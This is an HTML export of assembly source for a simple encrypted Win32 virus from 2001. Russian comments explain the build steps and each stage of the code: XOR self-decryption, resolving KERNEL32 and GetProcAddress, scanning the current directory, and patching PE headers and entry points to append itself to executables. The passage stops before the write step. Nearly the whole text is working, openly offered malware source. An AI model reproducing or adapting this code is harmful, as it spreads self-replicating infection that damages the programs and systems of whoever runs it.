<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; COMMENT %</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   PE-EXE.CRYPT. A very simple non-tsr Win32 virus. Scannes for</span><span class="sc0">
</span><span class="sc1">;   files in the current directory and infects it by appending to</span><span class="sc0">
</span><span class="sc1">;   the last section.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    Это очень простой вирус для Win32. К сожалению, он вышел только сейчас -</span><span class="sc0">
</span><span class="sc1">; я был занят другими делами, и у меня только недавно появилась возможность</span><span class="sc0">
</span><span class="sc1">; поставить WindowsNT и SoftIce для него, чтобы испытать этот продукт. И, как</span><span class="sc0">
</span><span class="sc1">; оказалось, не зря, так как я обнаружил одну мелкую ошибку, из-за которой,</span><span class="sc0">
</span><span class="sc1">; однако, вирус не работал под WindowsNT. Теперь, естественно, все в порядке.</span><span class="sc0">
</span><span class="sc1">;    О самом вирусе: нерезидентный, шифрованный; ищет и заражает PE-файлы в</span><span class="sc0">
</span><span class="sc1">; текущей директории (дописывается к последней секции). Для работы с файлами</span><span class="sc0">
</span><span class="sc1">; используются API из KERNEL32, адрес которого берется из стэка. Никак не</span><span class="sc0">
</span><span class="sc1">; проявляется.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                   DJ Sadovnikov (http://i.am/djsad), 26.01.2001</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;               Компилировать с помощью TASM32 5.0r</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                  tasm32 /m /ml simple.asm</span><span class="sc0">
</span><span class="sc1">;                  tlink32 /Tpe /x simple.obj,,,import32.lib</span><span class="sc0">
</span><span class="sc1">;                  pewrsec simple.exe</span><span class="sc0">
</span><span class="sc1">;                  del simple.obj</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;               Файлы из архива:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                  simple.asm  8900  (исходник вируса)</span><span class="sc0">
</span><span class="sc1">;                  simple.exe  8192  (бинарник вируса)</span><span class="sc0">
</span><span class="sc1">;                  simple.doc  8300  (техническая информация)</span><span class="sc0">
</span><span class="sc1">; %</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">


</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

        </span><span class="sc2">.386</span><span class="sc0">
        </span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

        </span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">Message</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Virus has started...'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Message</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Message</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">













</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                            НАЧАЛО ВИРУСА</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Virus</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Entry</span><span class="sc0">
</span><span class="sc5">Entry</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">


</span><span class="sc1">;[Расшифровываем вирус]</span><span class="sc0">

</span><span class="sc5">Key</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Crypt</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc0">
</span><span class="sc5">Loop1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc4">+</span><span class="sc5">Virus</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Loop1</span><span class="sc0">


</span><span class="sc1">;[Сохраняем в стеке адрес возврата в программу-носитель]</span><span class="sc0">

</span><span class="sc5">Crypt</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">68h</span><span class="sc0">
</span><span class="sc5">RetAddress</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">Start</span><span class="sc4">-(</span><span class="sc5">RetAddr</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc1">;[Ищем в памяти KERNEL32 и сохраняем его адрес в EDX]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F000h</span><span class="sc0">
</span><span class="sc5">FindKernel</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">FindKernel</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">KernelAddr</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем EBX на таблицу экспортов]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;[Подготавливаем регистры для поиска строки "GetProcAddress"]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">


</span><span class="sc1">;[Ищем стоку "GetProcAddress"]</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">Search</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetProcAddress</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">APINameSize</span><span class="sc0">
        </span><span class="sc6">repe</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Found</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Search</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">


</span><span class="sc1">;[Вычисляем адрес функции "GetProcAddress"]</span><span class="sc0">

</span><span class="sc5">Found</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetProcAddr</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc1">;[Находим первый файл в текущей директории]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DTA</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FMask</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindFirstFileA</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CallAPI</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SearchHandle</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;[Открываем файл]</span><span class="sc0">

</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0C0000000h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DTA</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CreateFileA</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CallAPI</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">FindNext</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;[Считываем четыре байта по смещению 3Ch]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HeaderOfs</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read</span><span class="sc0">


</span><span class="sc1">;[Считываем PE заголовок]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HeaderOfs</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HeaderSize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read</span><span class="sc0">


</span><span class="sc1">;[Проверяем тип файла и его зараженность]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'6666'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">


</span><span class="sc1">;[Вычисляем смещение последнего элемента таблице объектов]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">ObjectSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">-</span><span class="sc5">ObjectSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HeaderOfs</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ObjectOfs</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;[Считываем в память последний элемент таблицы объектов]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ObjectSize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Object</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read</span><span class="sc0">


</span><span class="sc1">;[Сравниваем физический и виртуальный размеры объекта]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Object</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Object</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">L1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Object</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;[Сохраняем старую и вычисляем новую точку входа]</span><span class="sc0">

</span><span class="sc5">L1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Object</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RetAddr</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RetAddress</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;[Корректируем размер файла]</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;[Вычисляем смещение, по которому нужно записать вирус]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Object</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Object</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek</span><span class="sc0">


